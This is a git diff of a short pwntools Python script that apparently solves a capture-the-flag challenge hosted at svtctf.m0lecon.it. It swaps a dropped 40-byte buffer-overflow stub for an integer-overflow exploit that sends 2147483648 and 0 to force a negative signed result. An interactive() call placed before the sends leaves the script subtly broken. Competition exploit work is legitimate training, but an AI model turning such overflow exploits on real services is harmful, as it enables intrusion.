@@ -1,31 +1,23 @@
 #!/usr/bin/env python3
 import os
-os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
+os.environ['PWNLIB_NOTERM'] = 'True'
 os.environ['PWNLIB_SILENT'] = 'True'
 from pwn import *
 
 HOST = "svtctf.m0lecon.it" 
 PORT = 13453
 
-def make_payload():
-
-    payload = b'A'*40
-    #print(payload)
-
-    return payload
-
 def main():
 
     server = remote(HOST, PORT)
     server.interactive()
-    g = server.recvuntil(b'Please enter your name: ', timeout=1)
-    print(g.decode())
+    server.recvuntil(b'Please, enter the first number: ')
+    server.sendline(b'2147483648')  #first unsigned int, set to MAX of signed integer +1
+    
+    server.recvuntil(b'Now, enter the second number: ') #second unsigned
+    server.sendline(b'0')
 
-    payload = make_payload()
-    log.info(f"Sending payload of length {len(payload)}")
-    server.sendline(payload)
-
-    # read remainder of program output
+    # result in signed overflows -> neg number
     server.interactive()
 
 if __name__ == '__main__':
